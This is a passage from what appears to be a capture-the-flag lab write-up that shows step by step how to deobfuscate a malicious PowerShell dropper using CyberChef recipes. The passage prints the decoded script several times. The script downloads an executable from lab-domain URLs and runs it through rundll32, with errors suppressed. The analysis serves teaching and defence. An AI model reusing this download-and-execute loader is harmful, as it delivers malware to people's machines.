2AEYAPQAoACcAVgAnACsAKAAnADMANwAnACsAJwBXACcAKQApAH0AfQBjAGEAdABjAGgAewB9AH0AJABKADEAXwBOAD0AKAAnAFQAMAAnACsAJwA4AEgAJwApAA</span><span class="p">==</span>
+</code></pre></div>
+<p>Drop the first 124 using the <code>Drop byte</code> recipe to isolate the Base64 portion of the script and use <code>From Base64</code> recipe to decode it.</p>
+<p>Use <code>Decode text</code> and set <code>Encoding = UTF-16LE (1200)</code>. Powershell scripts in general use UTF-16LE (1200) encoding by default.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">SET-VarIABle</span>  <span class="n">8ih567</span>  <span class="p">(</span>  <span class="no">[tYpe]</span><span class="p">(</span><span class="s2">&quot;{3}{0}{4}{2}{1}&quot;</span><span class="o">-f</span><span class="s1">&#39;YsT&#39;</span><span class="p">,</span><span class="s1">&#39;RecTORy&#39;</span><span class="p">,</span><span class="s1">&#39;M.iO.DI&#39;</span><span class="p">,</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;e&#39;</span><span class="p">));</span>   <span class="nb">SET-Item</span> <span class="p">(</span><span class="s2">&quot;vA&quot;</span><span class="p">+</span><span class="s2">&quot;RiA&quot;</span><span class="p">+</span><span class="s2">&quot;bLe:R&quot;</span><span class="p">+</span><span class="s2">&quot;i&quot;</span><span class="p">+</span><span class="s2">&quot;7xO3&quot;</span><span class="p">)</span> <span class="p">(</span><span class="no">[TyPe]</span><span class="p">(</span><span class="s2">&quot;{2}{5}{4}{3}{1}{0}&quot;</span><span class="o">-F</span> <span class="s1">&#39;R&#39;</span><span class="p">,</span><span class="s1">&#39;MaNaGE&#39;</span><span class="p">,</span><span class="s1">&#39;S&#39;</span><span class="p">,</span><span class="s1">&#39;VIcEPoInt&#39;</span><span class="p">,</span><span class="s1">&#39;.neT.sEr&#39;</span><span class="p">,</span><span class="s1">&#39;Ystem&#39;</span><span class="p">)</span> <span class="p">)</span>  <span class="p">;</span>  <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="p">(</span><span class="s1">&#39;Si&#39;</span><span class="p">+(</span><span class="s1">&#39;len&#39;</span><span class="p">+</span><span class="s1">&#39;t&#39;</span><span class="p">)+(</span><span class="s1">&#39;l&#39;</span><span class="p">+</span><span class="s1">&#39;yCont&#39;</span><span class="p">)+</span><span class="s1">&#39;i&#39;</span><span class="p">+(</span><span class="s1">&#39;n&#39;</span><span class="p">+</span><span class="s1">&#39;ue&#39;</span><span class="p">));</span><span class="nv">$var_A</span><span class="p">=</span><span class="nv">$P58B</span> <span class="p">+</span> <span class="no">[char]</span><span class="p">(</span><span class="n">64</span><span class="p">)</span> <span class="p">+</span> <span class="nv">$Z19R</span><span class="p">;</span><span class="nv">$B53N</span><span class="p">=((</span><span class="s1">&#39;S&#39;</span><span class="p">+</span><span class="s1">&#39;77&#39;</span><span class="p">)+</span><span class="s1">&#39;H&#39;</span><span class="p">);</span>  <span class="p">(</span>  <span class="nb">ls </span> <span class="n">VarIaBLE</span><span class="p">:</span><span class="n">8ih567</span>  <span class="p">).</span><span class="n">Value</span><span class="p">::</span><span class="s2">&quot;CREAt`E`D`iRecTOrY&quot;</span><span class="p">(</span><span class="nv">$HOME</span> <span class="p">+</span> <span class="p">(((</span><span class="s1">&#39;eN7Rr&#39;</span><span class="p">+</span><span class="s1">&#39;1s&#39;</span><span class="p">+</span><span class="s1">&#39;j9a&#39;</span><span class="p">+</span><span class="s1">&#39;eN&#39;</span><span class="p">)+</span><span class="s1">&#39;7&#39;</span><span class="p">+(</span><span class="s1">&#39;B&#39;</span><span class="p">+</span><span class="s1">&#39;cx&#39;</span><span class="p">)+(</span><span class="s1">&#39;4i&#39;</span><span class="p">+</span><span class="s1">&#39;aye&#39;</span><span class="p">)+</span><span class="s1">&#39;N7&#39;</span><span class="p">).</span><span class="s2">&quot;reP`La`cE&quot;</span><span class="p">((</span><span class="no">[CHaR]</span><span class="n">101</span><span class="p">+</span><span class="no">[CHaR]</span><span class="n">78</span><span class="p">+</span><span class="no">[CHaR]</span><span class="n">55</span><span class="p">),</span><span class="n">H_TrinG</span><span class="p">]</span><span class="no">[CHaR]</span><span class="n">92</span><span class="p">)));</span><span class="nv">$V57R</span><span class="p">=((</span><span class="s1">&#39;B&#39;</span><span class="p">+</span><span class="s1">&#39;46&#39;</span><span class="p">)+</span><span class="s1">&#39;V&#39;</span><span class="p">);</span> <span class="p">(</span><span class="n">vaRIaBle</span> <span class="p">(</span><span class="s2">&quot;R&quot;</span><span class="p">+</span><span class="s2">&quot;i&quot;</span><span class="p">+</span><span class="s2">&quot;7xO3&quot;</span><span class="p">)</span> <span class="p">).</span><span class="n">VAlUE</span><span class="p">::</span><span class="s2">&quot;SeCurI</span><span class="se">`T</span><span class="s2">`yP</span><span class="se">`R</span><span class="s2">O</span><span class="se">`T</span><span class="s2">oCOL&quot;</span> <span class="p">=</span> <span class="p">((</span><span class="s1">&#39;T&#39;</span><span class="p">+</span><span class="s1">&#39;ls&#39;</span><span class="p">)+</span><span class="s1">&#39;12&#39;</span><span class="p">);</span><span class="nv">$X44S</span><span class="p">=(</span><span class="s1">&#39;S8&#39;</span><span class="p">+</span><span class="s1">&#39;1D&#39;</span><span class="p">);</span><span class="nv">$Pa2nur4</span> <span class="p">=</span> <span class="p">(</span><span class="s1">&#39;K&#39;</span><span class="p">+(</span><span class="s1">&#39;_9&#39;</span><span class="p">+</span><span class="s1">&#39;O&#39;</span><span class="p">));</span><span class="nv">$O66G</span><span class="p">=((</span><span class="s1">&#39;F8&#39;</span><span class="p">+</span><span class="s1">&#39;8&#39;</span><span class="p">)+</span><span class="s1">&#39;W&#39;</span><span class="p">);</span><span class="nv">$Cyg0ku7</span><span class="p">=</span><span class="nv">$HOME</span><span class="p">+(((</span><span class="s1">&#39;eAwR&#39;</span><span class="p">+</span><span class="s1">&#39;r&#39;</span><span class="p">)+(</span><span class="s1">&#39;1&#39;</span><span class="p">+</span><span class="s1">&#39;sj9aeA&#39;</span><span class="p">)+(</span><span class="s1">&#39;w&#39;</span><span class="p">+</span><span class="s1">&#39;Bcx&#39;</span><span class="p">)+(</span><span class="s1">&#39;4ia&#39;</span><span class="p">+</span><span class="s1">&#39;y&#39;</span><span class="p">+</span><span class="s1">&#39;eA&#39;</span><span class="p">)+</span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="o">-repLACe</span><span class="p">(</span><span class="s1">&#39;eA&#39;</span><span class="p">+</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="no">[chaR]</span><span class="n">92</span><span class="p">)+</span><span class="nv">$Pa2nur4</span><span class="p">+(</span><span class="s1">&#39;.d&#39;</span><span class="p">+</span><span class="s1">&#39;ll&#39;</span><span class="p">);</span><span class="nv">$E01B</span><span class="p">=(</span><span class="s1">&#39;R7&#39;</span><span class="p">+</span><span class="s1">&#39;_S&#39;</span><span class="p">);</span><span class="nv">$Mrkjcim</span><span class="p">=((</span><span class="s1">&#39;]b&#39;</span><span class="p">+</span><span class="s1">&#39;2&#39;</span><span class="p">)+</span><span class="s1">&#39;H_&#39;</span><span class="p">+(</span><span class="s1">&#39;s://&#39;</span><span class="p">+</span><span class="s1">&#39;cdn.&#39;</span><span class="p">)+</span><span class="s1">&#39;band&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">+</span><span class="s1">&#39;t&#39;</span><span class="p">+</span><span class="s1">&#39;y&#39;</span><span class="p">+(</span><span class="s1">&#39;e&#39;</span><span class="p">+</span><span class="s1">&#39;ti.&#39;</span><span class="p">)+(</span><span class="s1">&#39;thm/&#39;</span><span class="p">+</span><span class="s1">&#39;files&#39;</span><span class="p">)+(</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;my&#39;</span><span class="p">+</span><span class="s1">&#39;stery&#39;</span><span class="p">)+(</span><span class="s1">&#39;gift&#39;</span><span class="p">+</span><span class="s1">&#39;.exe&#39;</span><span class="p">+</span><span class="s1">&#39;@]&#39;</span><span class="p">+</span><span class="s1">&#39;b2&#39;</span><span class="p">)+(</span><span class="s1">&#39;H_s:/&#39;</span><span class="p">+</span><span class="s1">&#39;/&#39;</span><span class="p">)+(</span><span class="s1">&#39;g&#39;</span><span class="p">+</span><span class="s1">&#39;oo&#39;</span><span class="p">+</span><span class="s1">&#39;gle&#39;</span><span class="p">)+(</span><span class="s1">&#39;.com&#39;</span><span class="p">)+(</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;@]&#39;</span><span class="p">)+(</span><span class="s1">&#39;b&#39;</span><span class="p">+</span><span class="s1">&#39;2H_s:&#39;</span><span class="p">+</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;/ww&#39;</span><span class="p">)+(</span><span class="s1">&#39;w.&#39;</span><span class="p">+</span><span class="s1">&#39;s&#39;</span><span class="p">)+(</span><span class="s1">&#39;ecret&#39;</span><span class="p">+</span><span class="s1">&#39;Sa&#39;</span><span class="p">+</span><span class="s1">&#39;nta&#39;</span><span class="p">)+(</span><span class="s1">&#39;.&#39;</span><span class="p">+</span><span class="s1">&#39;THM&#39;</span><span class="p">)+</span><span class="s1">&#39;/&#39;</span><span class="p">+(</span><span class="s1">&#39;Golden&#39;</span><span class="p">+</span><span class="s1">&#39;ti&#39;</span><span class="p">)+</span><span class="s1">&#39;c&#39;</span><span class="p">+</span><span class="s1">&#39;k&#39;</span><span class="p">+(</span><span class="s1">&#39;et&#39;</span><span class="p">+</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;THM_MYSTERY_FLAG@&#39;</span><span class="p">)+</span><span class="s1">&#39;]b&#39;</span><span class="p">+(</span><span class="s1">&#39;2H&#39;</span><span class="p">+</span><span class="s1">&#39;_s:&#39;</span><span class="p">)+(</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;/&#39;</span><span class="p">+</span><span class="s1">&#39;cdn&#39;</span><span class="p">)+(</span><span class="s1">&#39;.&#39;</span><span class="p">+</span><span class="s1">&#39;band&#39;</span><span class="p">+</span><span class="s1">&#39;i&#39;</span><span class="p">)+</span><span class="s1">&#39;tye&#39;</span><span class="p">+(</span><span class="s1">&#39;ti&#39;</span><span class="p">+</span><span class="s1">&#39;.&#39;</span><span class="p">)+</span><span class="s1">&#39;THM&#39;</span><span class="p">+(</span><span class="s1">&#39;/files/index/). &quot;rEPlA`cE&quot;((&#39;</span><span class="p">]</span><span class="n">b2</span><span class="s1">&#39;+(&#39;</span><span class="n">H</span><span class="s1">&#39;+&#39;</span><span class="n">_</span><span class="s1">&#39;)),([array](&#39;</span><span class="n">sd</span><span class="s1">&#39;,&#39;</span><span class="n">sw</span><span class="s1">&#39;),(&#39;</span><span class="n">ht</span><span class="s1">&#39;+&#39;</span><span class="n">tp</span><span class="s1">&#39;),&#39;</span><span class="n">3d</span><span class="s1">&#39;)[1]).&quot;sPl`It&quot;($T26A + $var_A + $B75P);$W71T=((&#39;</span><span class="n">P</span><span class="s1">&#39;+&#39;</span><span class="n">93</span><span class="s1">&#39;)+&#39;</span><span class="n">X</span><span class="s1">&#39;);foreach ($var_B in $Mrkj){try{(.(&#39;</span><span class="n">Ne</span><span class="s1">&#39;+&#39;</span><span class="n">w-Objec</span><span class="s1">&#39;+&#39;</span><span class="n">t</span><span class="s1">&#39;) sYsteM.net.WEbCLiEnt).&quot;DOwNLoAdf`I`Le&quot;($var_B, $Cyg0ku7);$G75Q=(&#39;</span><span class="n">W</span><span class="s1">&#39;+(&#39;</span><span class="n">8</span><span class="s1">&#39;+&#39;</span><span class="n">_R</span><span class="s1">&#39;));If ((&amp;(&#39;</span><span class="nb">Get-It</span><span class="s1">&#39;+&#39;</span><span class="n">e</span><span class="s1">&#39;+&#39;</span><span class="n">m</span><span class="s1">&#39;) $Cyg0ku7).&quot;l`ength&quot; -ge 30575) {.(&#39;</span><span class="n">r</span><span class="s1">&#39;+&#39;</span><span class="n">undll32</span><span class="s1">&#39;) $Cyg0ku7,(&#39;</span><span class="n">Co</span><span class="s1">&#39;+(&#39;</span><span class="n">nt</span><span class="s1">&#39;+&#39;</span><span class="n">rol_Ru</span><span class="s1">&#39;+&#39;</span><span class="n">n</span><span class="s1">&#39;)+(&#39;</span><span class="n">D</span><span class="s1">&#39;+&#39;</span><span class="n">LL</span><span class="s1">&#39;)).&quot;T`osTr`ING&quot;();$B29D=(&#39;</span><span class="n">Z</span><span class="s1">&#39;+(&#39;</span><span class="n">6</span><span class="s1">&#39;+&#39;</span><span class="n">2W</span><span class="s1">&#39;));break;$F26F=(&#39;</span><span class="n">V</span><span class="s1">&#39;+(&#39;</span><span class="n">37</span><span class="s1">&#39;+&#39;</span><span class="n">W</span><span class="s1">&#39;))}}catch{}}$J1_N=(&#39;</span><span class="n">T0</span><span class="s1">&#39;+&#39;</span><span class="n">8H</span><span class="err">&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>Use the <code>Find/Replace</code> recipe to remove [ ' () + ' " ` ] characters.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">SET-VarIABle</span>  <span class="n">8ih567</span>    <span class="no">[tYpe]</span><span class="p">{</span><span class="n">3</span><span class="p">}{</span><span class="n">0</span><span class="p">}{</span><span class="n">4</span><span class="p">}{</span><span class="n">2</span><span class="p">}{</span><span class="n">1</span><span class="p">}</span><span class="n">-fYsT</span><span class="p">,</span><span class="n">RecTORy</span><span class="p">,</span><span class="n">M</span><span class="p">.</span><span class="n">iO</span><span class="p">.</span><span class="n">DI</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">e</span><span class="p">;</span>   <span class="nb">SET-Item</span> <span class="n">vARiAbLe</span><span class="p">:</span><span class="n">Ri7xO3</span> <span class="no">[TyPe]</span><span class="p">{</span><span class="n">2</span><span class="p">}{</span><span class="n">5</span><span class="p">}{</span><span class="n">4</span><span class="p">}{</span><span class="n">3</span><span class="p">}{</span><span class="n">1</span><span class="p">}{</span><span class="n">0</span><span class="p">}</span><span class="o">-F</span> <span class="n">R</span><span class="p">,</span><span class="n">MaNaGE</span><span class="p">,</span><span class="n">S</span><span class="p">,</span><span class="n">VIcEPoInt</span><span class="p">,.</span><span class="n">neT</span><span class="p">.</span><span class="n">sEr</span><span class="p">,</span><span class="n">Ystem</span>   <span class="p">;</span>  <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="n">SilentlyContinue</span><span class="p">;</span><span class="nv">$var_A</span><span class="p">=</span><span class="nv">$P58B</span>  <span class="no">[char]</span><span class="n">64</span>  <span class="nv">$Z19R</span><span class="p">;</span><span class="nv">$B53N</span><span class="p">=</span><span class="n">S77H</span><span class="p">;</span>    <span class="nb">ls </span> <span class="n">VarIaBLE</span><span class="p">:</span><span class="n">8ih567</span>  <span class="p">.</span><span class="n">Value</span><span class="p">::</span><span class="n">CREAtEDiRecTOrY</span><span class="nv">$HOME</span>  <span class="n">eN7Rr1sj9aeN7Bcx4iayeN7</span><span class="p">.</span><span class="n">rePLacE</span><span class="no">[CHaR]101[CHaR]78[CHaR]55,H_TrinG][CHaR]</span><span class="n">92</span><span class="p">;</span><span class="nv">$V57R</span><span class="p">=</span><span class="n">B46V</span><span class="p">;</span> <span class="n">vaRIaBle</span> <span class="n">Ri7xO3</span> <span class="p">.</span><span class="n">VAlUE</span><span class="p">::</span><span class="n">SeCurITyPROToCOL</span> <span class="p">=</span> <span class="n">Tls12</span><span class="p">;</span><span class="nv">$X44S</span><span class="p">=</span><span class="n">S81D</span><span class="p">;</span><span class="nv">$Pa2nur4</span> <span class="p">=</span> <span class="n">K_9O</span><span class="p">;</span><span class="nv">$O66G</span><span class="p">=</span><span class="n">F88W</span><span class="p">;</span><span class="nv">$Cyg0ku7</span><span class="p">=</span><span class="nv">$HOMEeAwRr1sj9aeAwBcx4iayeAw</span> <span class="n">-repLACeeAw</span><span class="p">,</span><span class="no">[chaR]</span><span class="n">92</span><span class="nv">$Pa2nur4</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span><span class="nv">$E01B</span><span class="p">=</span><span class="n">R7_S</span><span class="p">;</span><span class="nv">$Mrkjcim</span><span class="p">=]</span><span class="n">b2H_s</span><span class="p">://</span><span class="n">cdn</span><span class="p">.</span><span class="n">bandityeti</span><span class="p">.</span><span class="n">thm</span><span class="p">/</span><span class="n">files</span><span class="p">/</span><span class="n">mysterygift</span><span class="p">.</span><span class="n">exe</span><span class="p">@]</span><span class="n">b2H_s</span><span class="p">://</span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">/@]</span><span class="n">b2H_s</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">secretSanta</span><span class="p">.</span><span class="n">THM</span><span class="p">/</span><span class="n">Goldenticket</span><span class="p">/</span><span class="n">THM_MYSTERY_FLAG</span><span class="p">@]</span><span class="n">b2H_s</span><span class="p">://</span><span class="n">cdn</span><span class="p">.</span><span class="n">bandityeti</span><span class="p">.</span><span class="n">THM</span><span class="p">/</span><span class="n">files</span><span class="p">/</span><span class="n">index</span><span class="p">/.</span> <span class="n">rEPlAcE</span><span class="p">]</span><span class="n">b2H_</span><span class="p">,</span><span class="no">[array]sd,sw,http,3d[1]</span><span class="p">.</span><span class="n">sPlIt</span><span class="nv">$T26A</span>  <span class="nv">$var_A</span>  <span class="nv">$B75P</span><span class="p">;</span><span class="nv">$W71T</span><span class="p">=</span><span class="n">P93X</span><span class="p">;</span><span class="k">foreach</span> <span class="nv">$var_B</span> <span class="k">in</span> <span class="nv">$Mrkj</span><span class="p">{</span><span class="k">try</span><span class="p">{.</span><span class="nb">New-Object</span> <span class="n">sYsteM</span><span class="p">.</span><span class="n">net</span><span class="p">.</span><span class="n">WEbCLiEnt</span><span class="p">.</span><span class="n">DOwNLoAdfILe</span><span class="nv">$var_B</span><span class="p">,</span> <span class="nv">$Cyg0ku7</span><span class="p">;</span><span class="nv">$G75Q</span><span class="p">=</span><span class="n">W8_R</span><span class="p">;</span><span class="k">If</span> <span class="p">&amp;</span><span class="nb">Get-Item</span> <span class="nv">$Cyg0ku7</span><span class="p">.</span><span class="n">length</span> <span class="o">-ge</span> <span class="n">30575</span> <span class="p">{.</span><span class="n">rundll32</span> <span class="nv">$Cyg0ku7</span><span class="p">,</span><span class="n">Control_RunDLL</span><span class="p">.</span><span class="n">TosTrING</span><span class="p">;</span><span class="nv">$B29D</span><span class="p">=</span><span class="n">Z62W</span><span class="p">;</span><span class="k">break</span><span class="p">;</span><span class="nv">$F26F</span><span class="p">=</span><span class="n">V37W</span><span class="p">}}</span><span class="k">catch</span><span class="p">{}}</span><span class="nv">$J1_N</span><span class="p">=</span><span class="n">T08H</span>
+</code></pre></div>
+<p>Use the <code>Find/Replace</code> recipe to replace <code>]b2H_</code> with <code>http</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">SET-VarIABle</span>  <span class="n">8ih567</span>    <span class="no">[tYpe]</span><span class="p">{</span><span class="n">3</span><span class="p">}{</span><span class="n">0</span><span class="p">}{</span><span class="n">4</span><span class="p">}{</span><span class="n">2</span><span class="p">}{</span><span class="n">1</span><span class="p">}</span><span class="n">-fYsT</span><span class="p">,</span><span class="n">RecTORy</span><span class="p">,</span><span class="n">M</span><span class="p">.</span><span class="n">iO</span><span class="p">.</span><span class="n">DI</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">e</span><span class="p">;</span>   <span class="nb">SET-Item</span> <span class="n">vARiAbLe</span><span class="p">:</span><span class="n">Ri7xO3</span> <span class="no">[TyPe]</span><span class="p">{</span><span class="n">2</span><span class="p">}{</span><span class="n">5</span><span class="p">}{</span><span class="n">4</span><span class="p">}{</span><span class="n">3</span><span class="p">}{</span><span class="n">1</span><span class="p">}{</span><span class="n">0</span><span class="p">}</span><span class="o">-F</span> <span class="n">R</span><span class="p">,</span><span class="n">MaNaGE</span><span class="p">,</span><span class="n">S</span><span class="p">,</span><span class="n">VIcEPoInt</span><span class="p">,.</span><span class="n">neT</span><span class="p">.</span><span class="n">sEr</span><span class="p">,</span><span class="n">Ystem</span>   <span class="p">;</span>  <span class="nv">$ErrorActionPreference</span> <span class="p">=</span> <span class="n">SilentlyContinue</span><span class="p">;</span><span class="nv">$var_A</span><span class="p">=</span><span class="nv">$P58B</span>  <span class="no">[char]</span><span class="n">64</span>  <span class="nv">$Z19R</span><span class="p">;</span><span class="nv">$B53N</span><span class="p">=</span><span class="n">S77H</span><span class="p">;</span>    <span class="nb">ls </span> <span class="n">VarIaBLE</span><span class="p">:</span><span class="n">8ih567</span>  <span class="p">.</span><span class="n">Value</span><span class="p">::</span><span class="n">CREAtEDiRecTOrY</span><span class="nv">$HOME</span>  <span class="n">eN7Rr1sj9aeN7Bcx4iayeN7</span><span class="p">.</span><span class="n">rePLacE</span><span class="no">[CHaR]101[CHaR]78[CHaR]55,H_TrinG][CHaR]</span><span class="n">92</span><span class="p">;</span><span class="nv">$V57R</span><span class="p">=</span><span class="n">B46V</span><span class="p">;</span> <span class="n">vaRIaBle</span> <span class="n">Ri7xO3</span> <span class="p">.</span><span class="n">VAlUE</span><span class="p">::</span><span class="n">SeCurITyPROToCOL</span> <span class="p">=</span> <span class="n">Tls12</span><span class="p">;</span><span class="nv">$X44S</span><span class="p">=</span><span class="n">S81D</span><span class="p">;</span><span class="nv">$Pa2nur4</span> <span class="p">=</span> <span class="n">K_9O</span><span class="p">;</span><span class="nv">$O66G</span><span class="p">=</span><span class="n">F88W</span><span class="p">;</span><span class="nv">$Cyg0ku7</span><span class="p">=</span><span class="nv">$HOMEeAwRr1sj9aeAwBcx4iayeAw</span> <span class="n">-repLACeeAw</span><span class="p">,</span><span class="no">[chaR]</span><span class="n">92</span><span class="nv">$Pa2nur4</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span><span class="nv">$E01B</span><span class="p">=</span><span class="n">R7_S</span><span class="p">;</span><span class="nv">$Mrkjcim</span><span class="p">=</span><span class="n">https</span><span class="p">://</span><span class="n">cdn</span><span class="p">.</span><span class="n">bandityeti</span><span class="p">.</span><span class="n">thm</span><span class="p">/</span><span class="n">files</span><span class="p">/</span><span class="n">mysterygift</span><span class="p">.</span><span class="n">exe</span><span class="nv">@https</span><span class="p">://</span><span class="n">google</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="nv">@https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">secretSanta</span><span class="p">.</span><span class="n">THM</span><span class="p">/</span><span class="n">Goldenticket</span><span class="p">/</span><span class="n">THM_MYSTERY_FLAG</span><span class="nv">@https</span><span class="p">://</span><span class="n">cdn</span><span class="p">.</span><span class="n">bandityeti</span><span class="p">.</span><span class="n">THM</span><span class="p">/</span><span class="n">files</span><span class="p">/</span><span class="n">index</span><span class="p">/.</span> <span class="n">rEPlAcEhttp</span><span class="p">,</span><span class="no">[array]sd,sw,http,3d[1]</span><span class="p">.</span><span class="n">sPlIt</span><span class="nv">$T26A</span>  <span class="nv">$var_A</span>  <span class="nv">$B75P</span><span class="p">;</span><span class="nv">$W71T</span><span class="p">=</span><span class="n">P93X</span><span class="p">;</span><span class="k">foreach</span> <span class="nv">$var_B</span> <span class="k">in</span> <span class="nv">$Mrkj</span><span class="p">{</span><span class="k">try</span><span class="p">{.</span><span class="nb">New-Object</span> <span class="n">sYsteM</span><span class="p">.</span><span class="n">net</span><span class="p">.</span><span class="n">WEbCLiEnt</span><span class="p">.</span><span class="n">DOwNLoAdfILe</span><span class="nv">$var_B</span><span class="p">,</span> <span class="nv">$Cyg0ku7</span><span class="p">;</span><span class="nv">$G75Q</span><span class="p">=</span><span class="n">W8_R</span><span class="p">;</span><span class="k">If</span> <span class="p">&amp;</span><span class="nb">Get-Item</span> <span class="nv">$Cyg0ku7</span><span class="p">.</span><span class="n">length</span> <span class="o">-ge</span> <span class="n">30575</span> <span class="p">{.</span><span class="n">rundll32</span> <span class="nv">$Cyg0ku7</span><span class="p">,</span><span class="n">Control_RunDLL</span><span class="p">.</span><span class="n">TosTrING</span><span class="p">;</span><span class="nv">$B29D</span><span class="p">=</span><span class="n">Z62W</span><span class="p">;</span><span class="k">break</span><span class="p">;</span><span class="nv">$F26F</span><span class="p">=</span><span class="n">V37W</span><span class="p">}}</span><span class="k">catch</span><span class="p">{}}</span><span class="nv">$J1_N</span><span class="p">=</span><span class="n">T08H</span>
+</code></pre></div>
+<p>Extract the URLs using <code>Extract URL</code> recipe and use the <code>Split</code> recipe with <code>Split Delimiter = @</code> and 'Join Delimiter = \n`.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>https://cdn.bandityeti.thm/files/mysterygift.exe
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>https://google.com/
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>https://www.secretSanta.THM/Goldenticket/THM_MYSTERY_FLAG
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>https://cdn.bandityeti.THM/files/index/
+</code></pre></div>
+<p>Finally defang the the links for safety using the <code>Defang URL</code> recipe.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>hxxps[://]cdn[.]bandityeti[.]thm/files/mysterygift[.]exe
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>hxxps[://]google[.]com/
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>hxxps[://]www[.]secretSanta[.]THM/Goldenticket/THM_MYSTERY_FLAG
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>hxxps[://]cdn[.]bandityeti[.]THM/files/index/
+</code></pre></div>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../day6/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Day 6 - Email Analysis">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Day 6 - Email Analysis
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../day8/" class="md-footer__link md-footer__link--next" aria-label="Next: Day 8 - Smart Contracts">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Day 8 - Smart Contracts
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2024 Nouman Noor
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
